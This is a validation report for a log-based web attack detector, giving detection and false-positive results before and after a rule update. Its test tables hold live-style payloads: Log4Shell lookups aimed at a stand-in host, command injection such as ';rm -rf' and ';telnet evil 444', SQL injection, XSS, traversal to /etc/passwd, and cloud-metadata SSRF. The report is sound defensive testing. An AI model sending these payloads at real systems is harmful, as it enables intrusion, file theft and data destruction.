# nginx-thresh — Post-Hardening Adversarial Validation

**Target:** `/home/seun/nginx-thresh`
**Binary:** `target/release/thresh`, v0.1.0, built **2026-11-12 12:41:09 -0700**
**SHA-256:** `8dc03faf4b4e505417fbf5459e3fe964490b50a72cf9f779ab02ce4d42e53467`
**Validated:** 2026-11-12 (MST), 20:01 UTC
**Baseline:** `docs/validation-report.md` (same day, pre-hardening)
**Mode:** read-only validation. No file under `src/`, `tests/`, `Cargo.toml`, `README.md`, `docs/detections.md` or the old reports was changed. This report is the only deliverable. Scratch corpora and harnesses live under `/home/seun/.hermes/cache/scratch/adversarial/`.
**Invocation:** `thresh <case>.log --no-color --top 100`; defaults otherwise (window 300 s, threshold 20, max events 250 000, auto threads).

> Follow-up after this report: the CMDI matrix-parameter regression was fixed with a separator guard, SSRF-002 was demoted to severity 3 and limited to fetch parameters, User-Agent traversal was added as TRAV-012, and header values are now percent-decoded before matching. The rule count is 139 and the current README reflects this build. This file stays as the record of the 138-rule run.

The binary was checked for freshness before every run: its mtime is newer than every file under `src/` (`find src -newer target/release/thresh` returns 0 files), so no rebuild was required. `cargo test --release` was run afterwards and did not change the binary hash.

---

## 1. Executive summary

| Metric | Before (validation-report.md) | After (this run) |
|---|---|---|
| Core attack payloads | 57 | 57 |
| Detected (≥1 event, expected category present) | 51 / 57 (**89.5 %**) | **57 / 57 (100 %)** |
| False negatives | 6 | **0** |
| Benign lookalikes (20) | 15 clean, 5 flagged (**25 % FP**) | **19 clean, 1 flagged (5 % FP)** |
| Benign FPs above MEDIUM | 4 CRITICAL (`SSRF-001`) | **0** |
| Realistic benign log (200 requests) | 60 events / 60 IPs (30 %), 35 CRITICAL | **25 events / 25 IPs (12.5 %)**, all MEDIUM recon, **0 HIGH/CRITICAL** |
| Aggregate attack log | 136 events / 57 lines, 51 IPs | **147 events / 57 lines, 57 IPs** (2.58 events/request) |
| Aggregate benign log (28 lines) | 5 events / 5 IPs | **1 event / 1 IP** |
| `BF-001` / `AUTH-001` / `SCAN-001` calibration | BF pass after tuning; SCAN failed at defaults | **all specified checks pass** |
| Rule inventory | 119 IDs | **138 rule specs + 3 stateful = 141 IDs** |
| Tests | — | **176 unit + 18 integration, 0 failures** |
| `demo/access-demo.log` | 600 219 lines, 379 events, 9 IPs, 12 workers | **600 219 lines, 382 events, 9 IPs, 8 workers, no truncation** |

**Bottom line:** every previously missed payload class is now detected, both P0 false-positive generators are gone, and the 200-request realistic benign log lost all 35 CRITICAL events. The build is **not regression-clean**, however: extending `CMDI-001`'s command list created a new **CRITICAL false-positive class on Java matrix parameters** (`/shop;env=prod`, `/products;cp=2`, …) at score 12.50. Two smaller gaps remain: `SSRF-002` still scores legitimate protocol-relative links at 8.75 HIGH, and the header-scope fix covers literal but not percent-encoded SQLi/XSS in `User-Agent`/`Referer`; `User-Agent` traversal has no rule at all.

**Verdict in one line:** detection and the two P0 fixes **PASS**; header scope is **PARTIAL**; command-injection hardening **PASSES on payloads but FAILS on a new CRITICAL false positive**; reporting P3 remains **not addressed**.

---

## 2. Build, method and corpora

### 2.1 Build identity

| Item | Value |
|---|---|
| Package / version | `nginx-thresh` 0.1.0 |
| Binary | `target/release/thresh` |
| Build time | 2026-11-12 12:41:09 -0700 |
| SHA-256 | `8dc03faf4b4e505417fbf5459e3fe964490b50a72cf9f779ab02ce4d42e53467` |
| Source freshness | 0 files under `src/` newer than the binary |
| Rule inventory | 138 `RuleSpec` entries in 11 families + `BF-001`, `AUTH-001`, `SCAN-001` stateful detectors |

`docs/detections.md` was updated after the binary was built, but it is documentation only; the last `src/` change was 12:40:24, before the 12:41:09 build. The binary therefore corresponds to the current source tree. No rebuild was performed, as instructed when the binary is current.

### 2.2 Harness and parsing caveats

The prior Python harness (`harness.py`) and its preserved case logs were reused unchanged. Three parsing limits still shape the tables:

1. `TOP THREATS` is deduplicated per `(source_ip, line_no)`, so a one-line log that trips six rules prints **one** row (the highest-scoring rule). The headline event count still reports all six hits. Per-rule attribution below therefore shows the **visible top rule** plus the category count; additional rule IDs on the same line are deduplicated and are not individually printed.
2. Category counts are **per rule hit**, not per request. A single payload can increment several categories (e.g. traversal plus LFI).
3. `score` in the tables is the dashboard score, not base severity. A 2xx response multiplies severity by 1.25; multi-rule lines also receive a per-IP contextual multiplier (1.15–1.30). Base severity is called out where the requested check is severity-based (`AUTH-001` 4, `BF-001` 7, `SCAN-001` 5).

### 2.3 Corpora run

| Corpus | Size | Purpose |
|---|---:|---|
| Core attack payloads | 57 | Same corpus as the prior report (traversal/LFI/SQLi/CMDi/Log4Shell/XSS/SSRF/webshell/recon/header/JSON) |
| Benign lookalikes | 20 | Same corpus as the prior report |
| Correlation scenarios | 9 + extras | `BF-001`/`AUTH-001`/`SCAN-001` thresholds, windows, 403 semantics |
| Aggregate logs | 2 | All 57 attacks in one log; 20 benign + 8 ordinary 404s in one log |
| Extended waves | 34 + 10 + 15 | Same `wave2.py`, `wave4.py`, `wave5.py` probes |
| Realistic benign log | 200 | `w3-realistic-benign-200.log` from the prior run |
| New benign lookalikes | 53 | UA SQL words, docs links with `<script>`, dot slugs, UI `cmd` verbs, public `url`, `.old`/`.tmp` downloads, static 403s, admin paths, bot UAs, encoded spaces/plus, matrix params, fragments |
| New calibration probes | 16 matrix + 5 UA traversal + 4 protocol-relative + 9 403/SCAN + 3 double-count + 3 normalization | Regression and double-count hunt |

Artifacts: `verify_after.py`, `verify_after_extra.py`, `verify_after.json`, `verify_after_extra.json`, plus refreshed `results.json`, `wave2.json`, `wave4.json`, `wave5.json`. Prior JSON snapshots are preserved as `*-prior.json`.

---

## 3. Before/after: every prior finding

| Prior finding (priority) | Before | After (observed) | Verdict |
|---|---|---|---|
| **`SSRF-001` critical FP** (P0) | `ben-05..08` all 8.75 CRITICAL; 20/200 realistic; 4/20 benign | All four named lookalikes **0 events**; 0 SSRF events in 200 realistic; `SSRF-001` is severity **2**, restricted to IP literals/dotless hosts inside fetch-shaped parameters; `?url=http://metadata/` scores **2.50 MEDIUM**; `?url=http://169.254.169.254` still detected (3 SSRF hits, top `SSRF-005`, 14.63) | **PASS** |
| **Log4Shell nested `${${lower:j}…}`** (P0) | 0 events | 2 events `LOG4SHELL-010` + `LOG4SHELL-011`, score **14.37**; raw and percent-encoded forms both detected | **PASS** |
| **SQLi literal/obfuscation gaps** (P1) | 0 events on 6 probes | All six detected: `SQLI-016` 3.75, `SQLI-017` 5.00 ×2, `SQLI-018` 5.00, `SQLI-001` 11.25 ×2 | **PASS** |
| **Header scopes uninspected** (P1) | UA SQLi 0; Referer SQLi 0; Referer traversal 0; Referer XSS 0 | `SQLI-019` 7.50; `SQLI-020` 7.50; `TRAV-011` 6.25; `XSS-013` 5.00; UA XSS `XSS-012` 5.00. **UA traversal 0** (no rule); **percent-encoded header SQLi/XSS 0** | **PARTIAL** |
| **CMDI allowlist too small** (P1) | `;rm`, `;shutdown`, `;telnet` all 0 | Each 1 event `CMDI-001`, score **12.50** | **PASS on payloads / FAIL on regression** — new matrix-parameter FP (see §6.2) |
| **`WEBSHELL-004` any `?cmd=`** (P1) | `/player?cmd=download` 11.25 CRITICAL | `/player?cmd=download` **0**; `/cart?cmd=add-to-cart` **0** | **PASS** |
| **`SCAN-001` effective threshold 40** (P1) | 30 distinct 404 at defaults → 0 | 30 distinct 404 at defaults → 1 event `SCAN-001`, score **5.00**, evidence “30 distinct 404/403 paths in 300s”; 24 distinct at `--threshold 5` → 0 | **PASS** |
| **`SCAN-001` static-asset 403 burst** (P1) | 40 distinct `/assets/private/N.jpg` 403 → 1 event 5.00 | **0 events** | **PASS** |
| **`BF-001` on non-login 401 burst** (P1) | 25 distinct `/api/v1/orders/N` 401 → `BF-001` 7.00 | 1 event **`AUTH-001`**, score **4.00**, no `BF-001`; evidence “25 failed authentication responses in 300s from non-login endpoints” | **PASS** |
| **`BF-001` login boundary** (P1) | 25 × 401 `/login` → 7.00; 19 → 0 | Same: 25 → `BF-001` **7.00**; 20 → 7.00; 19 → 0 | **PASS** |
| **`TRAV-009/010` `..;` and overlong UTF-8** (P2) | `/..;/..;/config.php` 0; `/..%c0%af..%c0%afetc/passwd` 0 | `TRAV-009` 7.50; `TRAV-010` 7.50 | **PASS** |
| **`XSS-004` handler list** (P2) | `<div ontouchmove=alert(1)>` 0 | `XSS-004` 6.25 | **PASS** |
| **`RECON-008` `/admin`** (P2) | 3.75 MEDIUM, 25 events/200 | Unchanged: 3.75 MEDIUM, 25 events/200 | **UNCHANGED (accepted)** |
| **`SENS-015` backup suffix** (P3) | `/download?file=release-notes.old` 5.00 | **0**; `config.php.old` still detected (2 events, 12.94, top `WEBSHELL-009`) | **PASS** |
| **Event-count inflation** (P3) | 136 events / 57 requests (2.39/request) | 147 / 57 (**2.58/request**); still no “unique offending requests” metric; TOP THREATS still dedups per line | **NOT ADDRESSED** |
| **Rule inventory drift** (P3) | 119 IDs; `RECON-013` absent | 138 specs + 3 stateful = **141 IDs**; `RECON-013` still absent, but docs now state 138, so no count mismatch | **PASS (cosmetic gap remains)** |

---

## 4. Exact payload verification (task 2)

All rows are single-line logs with a unique source IP unless marked as a burst. `—` means zero events.

### 4.1 SSRF, webshell and Log4Shell

| # | Exact payload / request | Observed categories (events) | Visible rule | Score | Verdict |
|---|---|---|---|---:|---|
| 1 | `/checkout?next=https://shop.example.com/checkout` | — | — | — | **clean** |
| 2 | `/account?return_url=https://shop.example.com/account` | — | — | — | **clean** |
| 3 | `/start?redirect=https://docs.example.com/start` | — | — | — | **clean** |
| 4 | `/img?url=https://cdn.example.com/image.png` | — | — | — | **clean** |
| 5 | `/?url=http://169.254.169.254` | SSRF (3) | `SSRF-005` | **14.63** | **detected** (metadata still covered; two other SSRF hits deduped on the same line) |
| 6 | `/?url=http://metadata/` (dotless host) | SSRF (1) | `SSRF-001` | **2.50** | detected, now MEDIUM informational — demotion confirmed |
| 7 | `/player?cmd=download` | — | — | — | **clean** |
| 8 | `/cart?cmd=add-to-cart` | — | — | — | **clean** |
| 9 | `/?x=%24%7B%24%7Blower:j%7Dndi:rmi://evil/b%7D` (encoded) | Log4Shell (2) | `LOG4SHELL-010` | **14.37** | **detected** |
| 10 | `/?x=${${lower:j}ndi:rmi://evil/b}` (raw) | Log4Shell (2) | `LOG4SHELL-010` | **14.37** | **detected** |

### 4.2 SQL injection

| # | Exact payload / request | Observed categories (events) | Visible rule | Score | Verdict |
|---|---|---|---|---:|---|
| 11 | `/?id=1'` | SQL Injection (1) | `SQLI-016` | **3.75** | **detected** |
| 12 | `/?id=1--` | SQL Injection (1) | `SQLI-017` | **5.00** | **detected** |
| 13 | `/?id=1#` (encoded `%23` and raw both tested) | SQL Injection (1) | `SQLI-017` | **5.00** | **detected** |
| 14 | `/?id=1 OR 2=2` (encoded `%20`) | SQL Injection (1) | `SQLI-018` | **5.00** | **detected** |
| 15 | `/?id=1 UN/**/ION SEL/**/ECT password FROM users` | SQL Injection (1) | `SQLI-001` | **11.25** | **detected** (comment-stripped view) |
| 16 | `/?id=1 /*!50000UNION*/ SELECT 1` | SQL Injection (1) | `SQLI-001` | **11.25** | **detected** (versioned comment preserved) |

### 4.3 Command injection, XSS and traversal

| # | Exact payload / request | Observed categories (events) | Visible rule | Score | Verdict |
|---|---|---|---|---:|---|
| 17 | `/?x=;rm -rf /var/www` | Command Injection (1) | `CMDI-001` | **12.50** | **detected** |
| 18 | `/?x=;shutdown -h now` | Command Injection (1) | `CMDI-001` | **12.50** | **detected** |
| 19 | `/?x=;telnet evil 444` | Command Injection (1) | `CMDI-001` | **12.50** | **detected** |
| 20 | `/?q=<div ontouchmove=alert(1)>` | XSS (1) | `XSS-004` | **6.25** | **detected** |
| 21 | `/..;/..;/config.php` | Path Traversal (1) | `TRAV-009` | **7.50** | **detected** |
| 22 | `/..%c0%af..%c0%afetc/passwd` | Path Traversal (1) | `TRAV-010` | **7.50** | **detected** |

### 4.4 Header scope

| # | Header payload | Observed categories (events) | Visible rule | Score | Verdict |
|---|---|---|---|---:|---|
| 23 | UA `Mozilla/5.0 ' OR 1=1--` | SQL Injection (1) | `SQLI-019` | **7.50** | **detected** |
| 24 | Referer `http://evil.example/?id=1' OR '1'='1` | SQL Injection (1) | `SQLI-020` | **7.50** | **detected** |
| 25 | UA `Mozilla/5.0 ../../etc/passwd` | — | — | — | **NOT DETECTED — no UA traversal rule** |
| 26 | Referer `http://evil.example/../../etc/passwd` | Path Traversal (1) | `TRAV-011` | **6.25** | **detected** |
| 27 | UA `Mozilla/5.0 <script>alert(1)</script>` | XSS (1) | `XSS-012` | **5.00** | **detected** |
| 28 | Referer `http://evil.example/?q=<script>alert(1)</script>` | XSS (1) | `XSS-013` | **5.00** | **detected** |
| 29 | Referer `…?id=1%27%20OR%20%271%27=%271` (percent-encoded) | — | — | — | **NOT DETECTED — header values are matched raw, not decoded** |
| 30 | UA `Mozilla/5.0%20%3Cscript%3Ealert(1)%3C/script%3E` | — | — | — | **NOT DETECTED — raw header, encoded payload evades** |
| 31 | Referer `http://evil.example/%2e%2e/%2e%2e/etc/passwd` | Path Traversal (1) | `TRAV-011` | **6.25** | detected — `TRAV-011` matches `%2e%2e` explicitly |

Rows 29–31 were added probes, not prior-report payloads. The four prior header payloads (23, 24, 26, 28) all pass; `User-Agent` traversal and encoded header values remain gaps.

### 4.5 Stateful calibration (exact scenarios)

| # | Scenario | Observed | Verdict |
|---|---|---|---|
| 32 | 30 distinct `GET /probe/N` 404s, 30 s, defaults | 1 event `SCAN-001`, score **5.00**, “30 distinct 404/403 paths in 300s” | **PASS** |
| 33 | 24 distinct 404s, `--threshold 5` | **0 events** (scan floor is `max(5,25)=25`) | **PASS** |
| 34 | 24 distinct 404s, defaults | **0 events** | **PASS** |
| 35 | 25 distinct 404s, defaults | 1 event `SCAN-001`, 5.00 | **PASS** |
| 36 | 40 distinct `/assets/private/N.jpg` 403s | **0 events** (static extensions excluded) | **PASS** |
| 37 | 25 distinct `POST /api/v1/orders/N` 401s | 1 event **`AUTH-001`**, score **4.00**, no `BF-001` | **PASS** |
| 38 | 25 × `POST /login` 401s | 1 event `BF-001`, score **7.00** (base severity 7) | **PASS (≥7)** |
| 39 | 20 × `POST /login` 401s | 1 event `BF-001`, 7.00 | **PASS (boundary)** |
| 40 | 19 × `POST /login` 401s | **0 events** | **PASS** |

### 4.6 Summary of exact checks

- Prior P0/P1 payloads: **27 of 28 checks pass**; the one failure is `User-Agent` traversal, which was not in the four prior header payloads but is part of the stated “UA/Referer traversal” expectation. All nine stateful/calibration assertions pass.
- All nine stateful/calibration rows pass, including the six task-specified assertions: 30@default fires, 24@threshold 5 does not, 40 static 403s silent, 25 API 401s → `AUTH-001` 4, 25 login 401s → `BF-001` ≥7, 19 login 401s silent.

---

## 5. Core corpus and aggregate results

### 5.1 Detection by family

| Family | Before | After | Misses after |
|---|---|---|---|
| Path Traversal | 8 / 10 (80 %) | **10 / 10 (100 %)** | — |
| Local File Inclusion | 4 / 4 (100 %) | **4 / 4** | — |
| SQL Injection | 9 / 11 (82 %) | **11 / 11 (100 %)** | — |
| Command Injection | 8 / 8 (100 %) | **8 / 8** | — |
| Log4Shell | 5 / 6 (83 %) | **6 / 6 (100 %)** | — |
| XSS | 3 / 4 (75 %) | **4 / 4 (100 %)** | — |
| SSRF | 5 / 5 (100 %) | **5 / 5** | — |
| Webshell | 3 / 3 (100 %) | **3 / 3** | — |
| Reconnaissance | 5 / 5 (100 %) | **5 / 5** | — |
| Sensitive File Access | 1 / 1 (100 %) | **1 / 1** | — |
| **Total** | **51 / 57 (89.5 %)** | **57 / 57 (100 %)** | **0** |

All 57 runs also had the *expected category* present (`expected_cat_present` true for every case), not merely a non-zero event count.

### 5.2 Aggregate logs

| Log | Lines | Events | Unique IPs | Categories |
|---|---:|---:|---:|---|
| `aggregate-attacks.log` | 57 | **147** | 57 | Path Traversal 47; LFI 23; SQL Injection 17; Log4Shell 15; SSRF 12; Command Injection 10; XSS 9; Recon 6; Webshell 5; Malformed 2; Sensitive 1 |
| `aggregate-benign.log` | 28 | **1** | 1 | Reconnaissance 1 (`RECON-008` on `/admin`) |

Before: attacks 136 events / 51 IPs; benign 5 events / 5 IPs (4 × `SSRF-001` + 1 × `RECON-008`). Event volume rose by 11 because the added SQLi/traversal/XSS/Log4Shell rules fire additional hits on payloads that were already detected; every attack line is now represented.

### 5.3 Benign lookalikes (20)

| ID | Request | Before | After | Assessment |
|---|---|---|---|---|
| ben-01 | `/search?q=union+station+coffee` | clean | clean | correct |
| ben-02 | `/search?q=select+a+size+from+the+list` | clean | clean | correct |
| ben-03 | `/download?file=manual.pdf` | clean | clean | correct |
| ben-04 | `/download?file=report-2026.pdf` | clean | clean | correct |
| ben-05 | `/checkout?next=https://shop.example.com/checkout` | 8.75 CRITICAL | **clean** | fixed |
| ben-06 | `/account?return_url=https://shop.example.com/account` | 8.75 CRITICAL | **clean** | fixed |
| ben-07 | `/start?redirect=https://docs.example.com/start` | 8.75 CRITICAL | **clean** | fixed |
| ben-08 | `/img?url=https://cdn.example.com/image.png` | 8.75 CRITICAL | **clean** | fixed |
| ben-09 | `/blog/2026/understanding-path-traversal` | clean | clean | correct |
| ben-10 | `/wp-content/uploads/2026/05/hero.jpg` | clean | clean | correct |
| ben-11 | `/wp-json/wp/v2/posts?per_page=10` | clean | clean | correct |
| ben-12 | `/api/users/42` | clean | clean | correct |
| ben-13 | `/products?sort=price&order=desc` | clean | clean | correct |
| ben-14 | `/` UA Googlebot | clean | clean | correct |
| ben-15 | `/health` UA `curl/8.7.1` | clean | clean | correct |
| ben-16 | `/search?q=blue+%20shoes&page=2` | clean | clean | correct |
| ben-17 | `/admin` GET 200, browser UA | 3.75 MEDIUM `RECON-008` | 3.75 MEDIUM `RECON-008` | accepted low-severity recon |
| ben-18 | `/index.php?page=2` | clean | clean | correct |
| ben-19 | `/search?q=javascript+framework+comparison` | clean | clean | correct |
| ben-20 | `/search?q=how+to+go+back+again` | clean | clean | correct |

**Rate:** 19/20 clean (95 %), 1/20 flagged (5 %), all MEDIUM. Excluding the deliberately admin-path case, 20/20 are clean. Before: 15/20 clean (75 %), 5 flagged, four of them CRITICAL.

### 5.4 Realistic benign log (200 requests)

`w3-realistic-benign-200.log` (product/blog/search/API/asset pages, outbound redirect links, `/admin`, `/wp-login.php`, `/graphql`, `/swagger-ui`, `/player?cmd=…`, `/cart?cmd=…`, Googlebot/curl):

| Metric | Before | After |
|---|---|---|
| Events / unique IPs | 60 / 60 | **25 / 25** |
| Request-level FP rate | 30 % | **12.5 %** |
| CRITICAL events | 35 (20 SSRF + 15 Webshell) | **0** |
| HIGH events | 0 | **0** |
| MEDIUM events | 25 recon | **25 recon** |
| Rule breakdown | Recon 25, SSRF 20, Webshell 15 | `RECON-008` 10, `RECON-009` 5, `RECON-005` 5, `RECON-004` 5 |

The remaining 12.5 % is entirely the known low-severity recon surface (`/admin`, `/admin/users`, `/wp-login.php`, `/graphql`, `/swagger-ui/index.html`), not injection noise. This is the single biggest improvement in the run: 35 CRITICAL false positives disappeared and the top of the ranked list is no longer dominated by `WEBSHELL-004`.

---

## 6. New-regression and false-positive hunt

### 6.1 New lookalike corpus (53 requests)

**43/53 clean (81.1 %); 10 flagged.** Clean categories included:

- UA strings containing SQL words: `UnionPacificBot/1.0`, `SQLSelector/1.0`, `(select; like) Gecko`, `information-schema-viewer/2.0` — all 0.
- Documentation links: `/web/html/element/script`, `/javascript/script-tag`, `?example=%3Cscript%3Ealert(1)%3C/script%3E` — all 0.
- `..` in slugs: `/blog/2026/what-..-means`, `/docs/version-1..2`, `/products/model..pro`, `?q=a..b`, `/blog/2026/dot-dot-slash-explained` — all 0.
- UI command verbs: `?cmd=play`, `pause`, `volume-up`, `next%20track` — all 0.
- Public absolute URLs: `?url=https://api.example.com/v1/status`, `?url=https://example.com/feed.xml`, `?url=/local/page`, `?next=/cart` — all 0.
- Downloads: `release-notes.old`, `report-2026.tmp`, `app.js.old` — all 0.
- Static asset single 403, bot/API UAs (Googlebot, bingbot, curl, python-requests, Playwright, Wget, PostmanRuntime, Slackbot), encoded spaces/plus (`blue%20shoes`, `c%2B%2B`, `red+shirt`, `100%25%20cotton`), fragments (`?step=1#install`, `?page=2#answer`), and benign matrix names (`jsessionid`, `version`, `lang`, `theme`) — all 0.

Flagged rows:

| Request | Events | Visible rule | Score | Assessment |
|---|---:|---|---:|---|
| `/products;id=123` | 1 | `CMDI-001` | **12.50** | **CRITICAL FP** — Java matrix parameter. `id` was already in the pre-hardening command list, so this specific token is pre-existing; the class is now more visible. |
| `/shop;env=prod` | 1 | `CMDI-001` | **12.50** | **NEW CRITICAL FP** — `env` was added to `CMDI-001`. |
| `/search?q=union+select+syntax` | 1 | `SQLI-001` | **11.25** | **HIGH FP** — pre-existing keyword rule; a literal documentation/search phrase is indistinguishable from injection. |
| `/download?file=config.php.old` | 2 | `WEBSHELL-009` (+ SENS) | **12.94** | Contextually a config-backup download, so sensitive-file detection is right; `WEBSHELL-009` (“upload parameter with an executable extension”) mislabels a download and pushes the score to CRITICAL. Pre-existing rule. |
| `/download?file=settings.yaml.old` | 1 | `SENS-015` | 5.00 | Intended: source/config backup. |
| `/download?file=dump.sql.old` | 1 | `SENS-015` | 5.00 | Intended: database dump backup. |
| `/admin` | 1 | `RECON-008` | 3.75 | Accepted low-severity recon. |
| `/admin/users` | 1 | `RECON-008` | 3.75 | Accepted low-severity recon. |
| `/administrator/index.php` | 1 | `RECON-008` | 3.75 | Accepted low-severity recon. |
| `/wp-admin/` (302) | 1 | `RECON-009` | 3.30 | Accepted low-severity recon. |

**Unexpected HIGH/CRITICAL false positives: 3** — two matrix-parameter hits (one new, one pre-existing class) and one keyword SQLi hit on `q=union+select`. `config.php.old` is a true sensitive-file hit at an inflated score, not a clean-traffic FP.

### 6.2 Regression: `CMDI-001` matrix parameters (CRITICAL)

This is the one new false-positive class introduced by the hardening. The extended command alternation matches a command token immediately before `=`, so any Java/JAX-RS/Spring matrix parameter named after a command fires at severity 10. Sixteen matrix probes:

| Matrix parameter | Fires? | Rule | Score (200) | New? |
|---|---|---:|---:|---|
| `/products;id=123` | **yes** | `CMDI-001` | 12.50 | pre-existing token (`id`) |
| `/shop;env=prod` | **yes** | `CMDI-001` | 12.50 | **new** (`env` added) |
| `/items;cp=2` | **yes** | `CMDI-001` | 12.50 | **new** (`cp` added) |
| `/items;mv=3` | **yes** | `CMDI-001` | 12.50 | **new** |
| `/items;rm=1` | **yes** | `CMDI-001` | 12.50 | **new** |
| `/items;tar=1` | **yes** | `CMDI-001` | 12.50 | **new** |
| `/items;find=x` | **yes** | `CMDI-001` | 12.50 | **new** |
| `/items;kill=1` | **yes** | `CMDI-001` | 12.50 | **new** |
| `/items;dd=1` | **yes** | `CMDI-001` | 12.50 | **new** |
| `/items;ssh=1` | **yes** | `CMDI-001` | 12.50 | **new** |
| `/items;ftp=1` | **yes** | `CMDI-001` | 12.50 | **new** |
| `/items;scp=1` | **yes** | `CMDI-001` | 12.50 | **new** |
| `/items;jsessionid=ABC` | no | — | — | clean |
| `/items;version=2` | no | — | — | clean |
| `/items;lang=en` | no | — | — | clean |
| `/items;theme=dark` | no | — | — | clean |

Root cause: `CMDI-001` matches a shell separator followed by one of the command names with a word boundary; the boundary succeeds between the command and `=`, so `;env=prod` looks like `;env` followed by an argument. The prior report's own recommendation warned about protecting matrix parameters; the implementation extended the command list without that guard. `jsessionid` is safe only because it is not a command name.

Suggested fix: require whitespace or `/` after the command token, or add a negative lookahead for `=` (matrix syntax), while keeping `;rm -rf`, `;shutdown -h now`, `;telnet evil 444` detected.

### 6.3 `SSRF-002` protocol-relative links (HIGH, documented)

Four legitimate protocol-relative URLs, all scored **8.75 HIGH**:

| Request | Rule | Score |
|---|---|---:|
| `/checkout?next=//shop.example.com/checkout` | `SSRF-002` | 8.75 |
| `/start?redirect=//docs.example.com/start` | `SSRF-002` | 8.75 |
| `/img?url=//cdn.example.com/image.png` | `SSRF-002` | 8.75 |
| `/share?link=//example.com/post/1` | `SSRF-002` | 8.75 |

`docs/detections.md` explicitly acknowledges that `SSRF-002` “will still trip on a legitimate partner redirect written as `//partner.example`.” It is not a regression from this hardening, but it remains a HIGH-severity false positive on ordinary protocol-relative links. The absolute public URLs that caused the prior P0 are fixed.

### 6.4 Header rules: literal vs encoded

| Header probe | Literal | Percent-encoded |
|---|---|---|
| SQLi in UA | 1 event `SQLI-019` 7.50 | **0** |
| SQLi in Referer | 1 event `SQLI-020` 7.50 | **0** |
| XSS in UA | 1 event `XSS-012` 5.00 | **0** |
| XSS in Referer | 1 event `XSS-013` 5.00 | **0** |
| Traversal in Referer | 1 event `TRAV-011` 6.25 | 1 event `TRAV-011` 6.25 (`%2e%2e` is in the pattern) |
| Traversal in UA | **0** | **0** |

Header rules match the raw header value. Real `Referer` URLs are normally percent-encoded, so the encoded SQLi/XSS cases are the realistic attack form; this is a practical false-negative surface even though the exact prior-report payloads (literal) pass.

### 6.5 Recon noise quantification

- 200-request realistic log: 25 MEDIUM recon events, 12.5 % request-level; 0 HIGH/CRITICAL.
- 53 new lookalikes: 4 MEDIUM recon events from admin paths; 0 HIGH/CRITICAL from recon.
- `RECON-008` remains at 3.75; `RECON-009` 3.75; `RECON-005` 3.75; `RECON-004` 3.75; `wp-admin` 302 scores 3.30.
- At volume, 25 distinct 403 admin paths from one IP produce 27 events: 25 × `RECON-008` + `BF-001` + `SCAN-001` (see §7.2).
- The prior report's FP-3 caveat still applies: admin-heavy sites will see a steady MEDIUM recon stream. This is accepted low-severity noise, not injection FP.

### 6.6 Other flagged lookalikes

- `/search?q=union+select+syntax` → `SQLI-001` 11.25. Pre-existing keyword rule; ben-01/ben-02 (`union station`, `select a size`) remain clean, but a search for the literal SQL phrase is scored HIGH. A context-free regex cannot distinguish this.
- `/download?file=config.php.old` → `WEBSHELL-009` + sensitive rule, 12.94 CRITICAL. The sensitive-file hit is legitimate; the webshell category and CRITICAL score are not. `release-notes.old`, `report-2026.tmp` and `app.js.old` are correctly clean.

---

## 7. Double-count and SCAN normalization

### 7.1 `AUTH-001` vs `BF-001` vs `SCAN-001`

`AUTH-001` filters 401 responses on non-login paths; `BF-001` filters 401/403 responses on login-hinted paths; `SCAN-001` counts distinct 404/403 paths. `AUTH-001` therefore shares no records with either detector:

| Scenario (same IP) | Events | Rules observed | Record overlap |
|---|---:|---|---|
| 25 non-login 401 only | 1 | `AUTH-001` | none — `BF-001` excludes non-login, `SCAN-001` ignores 401 |
| 25 login 401 only | 1 | `BF-001` | none — `AUTH-001` excludes login paths |
| 25 non-login 401 + 30 distinct 404 | 2 | `AUTH-001`, `SCAN-001` | disjoint (401 vs 404) |
| 25 login 401 + 25 non-login 401 + 30 distinct 404 | **3** | `BF-001`, `SCAN-001`, `AUTH-001` | disjoint; one event per detector |

Scores in the three-detector case: `BF-001` 9.10, `SCAN-001` 6.50, `AUTH-001` 5.20 (each base × 1.30 due to three distinct rules from one IP). No detector emits two events for the same rule/IP.

### 7.2 The remaining overlap: `BF-001` + `SCAN-001` on 403

`BF-001` counts 403 responses on login/admin paths, and `SCAN-001` also counts those same 403 records as distinct paths. That is a genuine double-count of the same log records:

| Scenario (same IP) | Events | Detail |
|---|---:|---|
| 25 × 403 `/login` (same path) | 1 | `BF-001` 7.00 only (one distinct path, no scan) |
| 25 distinct 403 `/login/attemptN` | **2** | `BF-001` + `SCAN-001` from the same 25 records |
| 25 distinct 403 `/admin/areaN` | **27** | `BF-001` + `SCAN-001` + 25 × `RECON-008` |
| 25 distinct 403 `/api/denied/N` | 1 | `SCAN-001` only (no login hint → no `AUTH`/`BF`) |
| 19 × 403 `/login` | 0 | below threshold |
| 40 × 403 static assets | 0 | static extensions excluded, so no paths are counted |

`AUTH-001` itself is clean; the overlap is between the older `BF-001` and `SCAN-001` when a 403 path also carries a login/admin hint. The task's “plain 403 bursts are ignored” is true for non-login 403s and for same-path bursts, but **not** for 25 distinct 403 paths, which still produce `SCAN-001` by design and can co-fire with `BF-001` on login/admin paths.

### 7.3 Path normalization

| Scenario | Result | Verdict |
|---|---|---|
| 30 × `/probe?x=N` 404 (same path, different query) | 0 events | query string ignored — pass |
| 30 × `/api/items/N?page=2` 404 (distinct path + query) | 1 `SCAN-001` | distinct API paths preserved — pass |
| 30 × `/missing?ref=N` 404 (query only differs) | 0 events | query string ignored — pass |
| 30 × `/assets/x/N.png` 404 | 0 events | static extension excluded — pass |
| 24 distinct 404 at defaults | 0 | below floor 25 — pass |
| 25 distinct 404 at defaults | 1 `SCAN-001` (5.00) | floor 25 — pass |
| 30 distinct 404 at defaults | 1 `SCAN-001` (5.00) | task expectation — pass |

`path_key` strips only `?`/`#`; it does not normalize percent-encoding, duplicate slashes or trailing slashes, so `/p` and `/p/` count as distinct. No corpus case exercised that; noted as a residual edge, not a failure of the stated normalization.

---

## 8. Sanity checks

### 8.1 Tests

```
cargo test --release
  unit:        176 passed; 0 failed; 1 ignored
  integration: 18 passed; 0 failed
```

Both suites completed in ~0.5 s each. The binary hash was unchanged afterwards. This matches the stated 176 + 18 target.

### 8.2 Demo log with defaults

`demo/access-demo.log` (112.37 MiB, 600 219 lines, 3 malformed):

| Metric | Value |
|---|---|
| Lines scanned | 600 219 |
| Malformed | 3 |
| Events | **382** |
| Unique offending IPs | **9** |
| Workers | **8** (auto) |
| Execution | 607.65 ms |
| Throughput | 987.8K lines/s |
| Severity split | CRITICAL 305; HIGH 45; MEDIUM 32 |
| Truncation notice | **absent** (382 events ≪ 250 000 cap) |

